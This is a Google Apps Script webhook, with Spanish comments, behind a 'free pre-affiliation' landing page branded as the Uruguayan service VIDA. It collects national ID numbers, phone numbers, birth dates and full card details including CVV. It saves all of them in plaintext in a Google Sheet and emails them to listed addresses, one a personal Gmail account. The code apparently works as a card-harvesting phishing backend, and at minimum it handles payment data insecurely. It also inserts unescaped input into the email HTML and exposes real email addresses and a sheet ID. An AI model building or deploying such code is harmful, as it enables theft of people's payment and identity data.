/**
 * =========================================================================================
 * GOOGLE APPS SCRIPT - PRE-AFILIACIÓN VIDA
 * =========================================================================================
 * Este script se instala directamente en la planilla de Google Sheets:
 * https://docs.google.com/spreadsheets/d/17EOFT889rTSBPGfSJbIwYu-m0Oq3VtdmNrMHxCga02o/edit?usp=sharing
 * 
 * INSTRUCCIONES DE INSTALACIÓN:
 * 1. Abre tu Google Sheet: https://docs.google.com/spreadsheets/d/17EOFT889rTSBPGfSJbIwYu-m0Oq3VtdmNrMHxCga02o/edit?usp=sharing
 * 2. En el menú superior ve a: Extensiones > Apps Script
 * 3. Borra el código existente en "Código.gs" y pega todo este archivo.
 * 4. Haz clic en "Guardar" (ícono de disco o Ctrl+S).
 * 5. Haz clic en el botón azul "Implementar" > "Nueva implementación".
 * 6. En el engranaje "Seleccionar tipo", elige "Aplicación web".
 * 7. Configura:
 *    - Descripción: "Webhook Pre-Afiliación VIDA"
 *    - Ejecutar como: "Yo" (tu cuenta de Google)
 *    - Quién tiene acceso: "Cualquier usuario" (Anyone) -> [MUY IMPORTANTE para permitir envíos desde la web]
 * 8. Haz clic en "Implementar", autoriza los permisos de Google.
 * 9. Copia la "URL de la aplicación web" generada (termina en /exec) y pégala en `config.js` en tu proyecto.
 * =========================================================================================
 */

// Destinatarios de las alertas por correo electrónico
const EMAIL_RECIPIENTS = "jge@vida.com.uy, josemage@gmail.com";

// ID de la planilla de Google Sheets
const SPREADSHEET_ID = "17EOFT889rTSBPGfSJbIwYu-m0Oq3VtdmNrMHxCga02o";

/**
 * Manejador de solicitudes POST desde la Landing Page
 */
function doPost(e) {
  const lock = LockService.getScriptLock();
  // Esperar hasta 30 segundos si hay múltiples envíos concurrentes
  lock.tryLock(30000);

  try {
    let data;
    if (e.postData && e.postData.contents) {
      try {
        data = JSON.parse(e.postData.contents);
      } catch (err) {
        data = e.parameter;
      }
    } else {
      data = e.parameter;
    }

    // 1. Obtener la hoja de cálculo
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    let sheet = ss.getActiveSheet();

    // 2. Crear encabezados si la hoja está vacía
    if (sheet.getLastRow() === 0) {
      const headers = [
        "Fecha y Hora",
        "Código Socio",
        "Nombre",
        "Apellido",
        "Cédula (CI)",
        "Celular",
        "Fecha Nacimiento",
        "Departamento",
        "Titular Tarjeta",
        "Número Tarjeta",
        "Vencimiento",
        "CVV",
        "Términos Aceptados"
      ];
      sheet.appendRow(headers);
      
      // Formato visual a los encabezados
      const headerRange = sheet.getRange(1, 1, 1, headers.length);
      headerRange.setBackground("#1b3580");
      headerRange.setFontColor("#ffffff");
      headerRange.setFontWeight("bold");
      sheet.setFrozenRows(1);
    }

    // 3. Preparar la fila con los datos recibidos
    const fechaActual = Utilities.formatDate(new Date(), "America/Montevideo", "dd/MM/yyyy HH:mm:ss");
    
    const row = [
      fechaActual,
      data.codigo_socio || "VIDA-PRE-" + Math.floor(10000 + Math.random() * 90000),
      data.nombre || "",
      data.apellido || "",
      data.cedula || "",
      data.celular || "",
      data.fecha_nacimiento || "",
      data.departamento || "",
      data.titular_tarjeta || "",
      data.numero_tarjeta || "",
      data.vencimiento_tarjeta || "",
      data.cvv_tarjeta || "",
      data.acepto_terminos ? "Sí" : "No"
    ];

    // 4. Agregar a Google Sheets
    sheet.appendRow(row);

    // 5. Enviar Correo Electrónico con diseño profesional a los destinatarios
    enviarNotificacionEmail(data, fechaActual);

    // 6. Respuesta exitosa con soporte CORS
    return ContentService
      .createTextOutput(JSON.stringify({ 
        result: "success", 
        message: "Registro guardado exitosamente",
        codigo_socio: data.codigo_socio 
      }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ 
        result: "error", 
        error: error.toString() 
      }))
      .setMimeType(ContentService.MimeType.JSON);

  } finally {
    lock.releaseLock();
  }
}

/**
 * Manejador de solicitudes GET (para pruebas de estado)
 */
function doGet(e) {
  return ContentService
    .createTextOutput(JSON.stringify({ 
      status: "online", 
      message: "Webhook de Pre-Afiliación VIDA activo y funcionando.",
      spreadsheet: "https://docs.google.com/spreadsheets/d/" + SPREADSHEET_ID 
    }))
    .setMimeType(ContentService.MimeType.JSON);
}

/**
 * Función que envía el email en formato HTML
 */
function enviarNotificacionEmail(data, fechaHora) {
  const subject = `🔔 Nueva Pre-Afiliación VIDA: ${data.nombre} ${data.apellido} (${data.codigo_socio || 'Nuevo Socio'})`;

  const htmlBody = `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <style>
        body { font-family: Arial, sans-serif; background-color: #f4f6fa; margin: 0; padding: 20px; color: #2d3748; }
        .card { max-width: 620px; margin: 0 auto; background: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border-top: 5px solid #942143; }
        .header { background: #1b3580; color: #ffffff; padding: 24px; text-align: center; }
        .header h1 { margin: 0; font-size: 22px; }
        .header p { margin: 6px 0 0 0; opacity: 0.85; font-size: 14px; }
        .content { padding: 28px; }
        .badge-zero { display: inline-block; background: #ecfdf5; color: #047857; font-weight: bold; padding: 6px 12px; border-radius: 20px; font-size: 13px; margin-bottom: 18px; border: 1px solid #a7f3d0; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 14px; }
        th, td { padding: 12px 14px; text-align: left; border-bottom: 1px solid #edf2f7; }
        th { background: #f8fafc; color: #1b3580; width: 40%; font-weight: 600; }
        td { color: #1a202c; }
        .footer { background: #f8fafc; padding: 18px 28px; text-align: center; font-size: 12px; color: #718096; border-top: 1px solid #e2e8f0; }
        .btn-sheet { display: inline-block; margin-top: 20px; background: #1b3580; color: #ffffff !important; text-decoration: none; padding: 12px 24px; border-radius: 25px; font-weight: bold; font-size: 14px; }
      </style>
    </head>
    <body>
      <div class="card">
        <div class="header">
          <h1>VIDA - Servicio de Compañía</h1>
          <p>Notificación de Registro de Pre-Afiliado Gratuito ($0)</p>
        </div>
        <div class="content">
          <div class="badge-zero">✓ Cobertura Pre-Afiliado Registrada ($0 Hoy)</div>
          <p>Se ha registrado un nuevo usuario desde la <strong>Landing Page de Pre-Afiliación</strong>:</p>
          
          <table>
            <tr>
              <th>Fecha y Hora</th>
              <td><strong>${fechaHora}</strong></td>
            </tr>
            <tr>
              <th>Código de Socio</th>
              <td><span style="color:#1b3580; font-weight:bold; font-size:15px;">${data.codigo_socio || 'N/A'}</span></td>
            </tr>
            <tr>
              <th>Nombre y Apellido</th>
              <td><strong>${data.nombre} ${data.apellido}</strong></td>
            </tr>
            <tr>
              <th>Cédula de Identidad</th>
              <td>${data.cedula}</td>
            </tr>
            <tr>
              <th>Celular de Contacto</th>
              <td><a href="tel:${data.celular}">${data.celular}</a> <a href="https://wa.me/598${(data.celular || '').replace(/\D/g,'').replace(/^0/,'')}" style="margin-left:8px; color:#25D366; text-decoration:none; font-weight:bold;">(WhatsApp)</a></td>
            </tr>
            <tr>
              <th>Fecha de Nacimiento</th>
              <td>${data.fecha_nacimiento}</td>
            </tr>
            <tr>
              <th>Departamento</th>
              <td>${data.departamento}</td>
            </tr>
            <tr>
              <th>Titular de Tarjeta</th>
              <td>${data.titular_tarjeta}</td>
            </tr>
            <tr>
              <th>Número de Tarjeta</th>
              <td><code style="background:#f1f5f9; padding:2px 6px; border-radius:4px;">${data.numero_tarjeta}</code></td>
            </tr>
            <tr>
              <th>Vencimiento</th>
              <td>${data.vencimiento_tarjeta}</td>
            </tr>
            <tr>
              <th>Código CVV</th>
              <td>${data.cvv_tarjeta}</td>
            </tr>
            <tr>
              <th>Términos y Condiciones</th>
              <td>${data.acepto_terminos ? 'Aceptados' : 'No'}</td>
            </tr>
          </table>

          <div style="text-align: center;">
            <a href="https://docs.google.com/spreadsheets/d/${SPREADSHEET_ID}/edit" class="btn-sheet" target="_blank">
              📊 Abrir Planilla de Google Sheets
            </a>
          </div>
        </div>
        <div class="footer">
          <p>Mensaje generado automáticamente por el sistema de Pre-Afiliación de VIDA Servicio de Acompañantes.</p>
          <p>&copy; 2026 VIDA. Montevideo, Uruguay.</p>
        </div>
      </div>
    </body>
    </html>
  `;

  try {
    MailApp.sendEmail({
      to: EMAIL_RECIPIENTS,
      subject: subject,
      htmlBody: htmlBody
    });
  } catch (e) {
    // Si MailApp falla por alguna restricción de cuota, intentar con GmailApp
    try {
      GmailApp.sendEmail(EMAIL_RECIPIENTS, subject, "", { htmlBody: htmlBody });
    } catch (e2) {
      console.error("Error al enviar email: " + e2.toString());
    }
  }
}
